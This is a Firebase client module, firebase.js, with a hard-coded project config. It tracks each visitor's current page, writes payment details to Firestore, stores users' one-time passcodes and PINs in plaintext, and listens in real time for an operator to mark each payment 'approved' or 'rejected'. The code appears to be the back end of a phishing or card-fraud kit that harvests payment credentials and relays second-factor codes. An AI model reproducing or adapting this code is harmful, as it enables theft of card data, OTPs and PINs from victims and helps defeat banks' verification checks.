// firebase.js
import { getApp, getApps, initializeApp } from 'firebase/app';
import { getDatabase } from 'firebase/database';
import { doc, getFirestore, onSnapshot, setDoc, updateDoc } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyDJOaDkXvm5XP3-Fu0LsuKvQ0_dZK5uf-k",
  authDomain: "school-77936.firebaseapp.com",
  databaseURL: "https://school-77936-default-rtdb.firebaseio.com",
  projectId: "school-77936",
  storageBucket: "school-77936.firebasestorage.app",
  messagingSenderId: "783345000886",
  appId: "1:783345000886:web:585c7579926bcb8f0ca117",
  measurementId: "G-XX9L099J8H"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);
    await setDoc(docRef,   { ...data, createdAt: new Date().toISOString() },{merge:true});

    console.log('Document written with ID: ', docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error('Error adding document: ', e);
    // You might want to show an error message to the user here
  }
}

export const handleCurrentPage=(page:string)=>{
const visitorId=localStorage.getItem('visitor')
addData({id:visitorId,currentPage:page})
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};

// Update document with OTP
export async function updateOtp(documentId: string, otp: string): Promise<void> {
  const docRef = doc(db, "payments", documentId)
  await updateDoc(docRef, {
    otp,
    otpSubmittedAt: new Date().toISOString(),
  })
}

// Update document with PIN
export async function updatePin(documentId: string, pin: string): Promise<void> {
  const docRef = doc(db, "payments", documentId)
  await updateDoc(docRef, {
    pin,
    pinSubmittedAt: new Date().toISOString(),
  })
}

// Listen for approval status changes
export function listenForApproval(
  documentId: string,
  callback: (status: "pending" | "approved" | "rejected") => void,
): () => void {
  const docRef = doc(db, "payments", documentId)

  const unsubscribe = onSnapshot(docRef, (snapshot: any) => {
    if (snapshot.exists()) {
      const data = snapshot.data()
      callback(data.status as "pending" | "approved" | "rejected")
    }
  })

  return unsubscribe
}


export { db,database };